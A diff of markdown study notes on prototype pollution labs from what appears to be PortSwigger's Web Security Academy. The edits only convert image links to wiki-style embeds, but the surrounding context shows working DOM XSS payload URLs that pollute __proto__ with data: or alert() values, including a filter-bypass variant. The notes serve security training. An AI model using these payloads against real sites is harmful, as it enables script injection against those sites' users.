@@ -98,7 +98,7 @@ target[key] = source[key]
 
 ### DOM XSS via client-side prototype pollution
 
-![searchlogger.js](attachments/prototype-pollution/file-20260214151048383%201.png)
+![[attachments/prototype-pollution/file-20260214151048383 1.png|searchlogger.js]]
 
 ```
 0a2c00e903b91645815ec10100cd001c.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
@@ -106,7 +106,7 @@ target[key] = source[key]
 
 ### DOM XSS via an alternative prototype pollution vector
 
-![searchLoggerAlternate.js](attachments/prototype-pollution/file-20260214151048383.png)
+![[attachments/prototype-pollution/file-20260214151048383.png|searchLoggerAlternate.js]]
 
 ```
 0a0c00d404f574ab83fae7a3002500bd.web-security-academy.net/?__proto__.sequence=alert(1)-
@@ -114,7 +114,7 @@ target[key] = source[key]
 
 ### Placeholder
 
-![](attachments/prototype-pollution/file-20260214151048382%201.png)
+![[attachments/prototype-pollution/file-20260214151048382 1.png]]
 
 ```
 0a39008e04e67439842b054b00190057.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1);//
@@ -130,7 +130,7 @@ target[key] = source[key]
 
 ### Client-side prototype pollution via browser APIs
 
-![](attachments/prototype-pollution/file-20260214151048381.png)
+![[attachments/prototype-pollution/file-20260214151048381.png]]
 
 ```
 0ad3005503235e1182dfca4b00bc000b.web-security-academy.net/?__proto__[value]=data:,alert(1)
@@ -140,7 +140,7 @@ target[key] = source[key]
 
 Use the constructor instead of `__proto__`.
 
-![](attachments/prototype-pollution/file-20260214151048382.png)
+![[attachments/prototype-pollution/file-20260214151048382.png]]
 
 ## Remediation
 
